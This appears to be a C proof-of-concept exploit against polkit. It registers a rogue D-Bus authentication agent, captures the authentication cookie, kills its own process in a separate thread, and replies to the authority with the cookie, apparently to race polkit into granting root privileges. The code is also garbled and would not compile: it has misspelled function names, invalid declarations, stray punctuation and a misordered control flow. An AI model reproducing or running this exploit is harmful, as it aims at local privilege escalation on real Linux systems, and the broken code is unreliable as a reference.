#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dbus/dbus.h>
#include <unistd.h>
#include <gio/gio.h>
#include <glib/gprintf.h>
#include <gio/gdbusconnection.h>
#include <dbus/dbus-glib-lowlevel.h>
#include <pthread.h>

char *action_id;
char *cookie;
u_int64_t = start_time;

int call_register() {
    // Reference : polkit_authority_register_authentication_agent
    // https://github.dev/wingo/polkit/blob/master/src/polkit/polkitauthority.c#L1053

    GDBusConnection *connetion;
    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GVariant *subject_value;
     
    
    const gchar *locale = "en_US.UTF-8";
    const gchar *object_path = "/org/freedesktop/PolicyKit1/AuthenticationAgent";

    GVariant *dict;
    GVariantBuilder builder;

    g_variant_builder_init (&builder, G_VARIANT_TYPE ("a{sv}"));
    const gchar *kind;
    kind = "unix-process";
    g_variant_builder_add (&builder, "{sv}", "pid", getpid());
    g_variant_builder_add (&builder, "{sv}", "start-time", u_int64_t(start_time));
    dict = g_variant_builder_end (&builder);
    subject_value = g_variant_new ("(s@a{sv})", kind, dict);

    connetion = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);
    g_dbus_connction_call(
        connetion,
        "org.freedesktop.PolicyKit1",
        "/org/freedesktop/PolicyKit1/Authority",
        "org.freedesktop.PolicyKit1.Authority",
        "RegisterAuthenticationAgent",
        g_variant_new("(@(sa{sv})&s&s)", &subject_value, &locale, &object_path),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL,
        NULL 
    );

    return 0;
}

const DBusObjectPathVTable server_vtable = {
    .message_function = server_message_handler
};


void *kill_myself(){
    
    int pid = getpid();

    sleep(0.00001);
    kill(pid, SIGKILL);

}

int server_handle_authentication_agent_response2(char *cookie, char *identities )
{
    //https://github.dev/wingo/polkit/blob/master/src/polkitbackend/polkitbackendauthority.c#L1065
    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GDBusConnection *connetion;

    connetion = g_bust_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);
    g_dbus_connetion_call(
        connetion, 
        "org.freedesktop.PolicyKit1",
        "/org/freedesktop/PolicyKit1/Authority",
        "org.freedesktop.PolicyKit1.Authority",
        "AuthenticationAgentResponse2",
        g_variant_new("(u&s@(sa{sv}))", getpid(), cookie, identities),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL,
        NULL
        );

    return 0;
}


DBusHandlerResult server_message_handler(DBusConnection *conn, DBusMessage *message, void *data){

    DBusHandlerResult result;

    if (dbus_message_is_method_call(message, "org.freedesktop.PolicyKit1.Authority","BeginAuthentication")){
        
        const char *icon_name ;
        const char *details_gvariant;
        const char *identities_gvariant;

        
        printf("[*] Received authentication request\n");
        printf("[*] Action ID: %s\n", &action_id);
        printf("[*] Cookie: %s\n", &cookie);

        DBusError err;
        dbus_error_init(&err);
        dbus_message_get_args(message, &err,  //https://github.dev/wingo/polkit/blob/master/src/polkitagent/polkitagentlistener.c#L636
            DBUS_TYPE_STRING, &action_id,
            DBUS_TYPE_STRING, &message,
            DBUS_TYPE_STRING, &icon_name, 
            DBUS_TYPE_VARIANT &details_gvariant, 
            DBUS_TYPE_STRING, &cookie, 
            DBUS_TYPE_VARIANT,&identities_gvariant,
            DBUS_TYPE_INVALID,
            )；

        pthread_t ntid;
        int err = pthread_create(ntid, NULL, kill_myself, NULL); // kill self 
        if (err !=0){
            fprintf(stderr, "can't crate thread %s\n", strerror(err));
            return 1;
        }

    server_handle_authentication_agent_response2 (cookie, identities_gvariant);

    }

    return result;

}
int PolkitAuthenticationAgent(){

    // Reference ：https://github.dev/wingo/polkit/blob/master/src/examples/cancel.c#L142
    GMainLoop *loop;
    DBusConnection *conn;
    DBusError error;

    dbus_error_init(&error);
    conn = dbus_bus_get(DBUS_BUS_SYSTEM, &error);
    if (!conn){
        fprintf(stderr, "Failed to get system DBus connection: %s", error.message);
        return 1;
    }

    if (!dbus_connection_register_object_path(conn, "/org/freedesktop/PolicyKit1/AuthenticationAgent", &server_vtable, NULL)){
        fprintf(stderr, "Failed to register a objetct path for Authroity\n");
        return 1;
    }


    loop = g_main_loop_new(NULL, FALSE);
    g_main_loop_run(loop);
    char temp[200] = {0};
    FILE*p = popen("cat /proc/self/stat | tr -s ' ' | awk {'print $22'}", "r");
    fread(temp, 10, 1, p);
    start_time = int64_t(temp);
    call_register();
    printf("[*] D-Bus message loop new running ...");
}
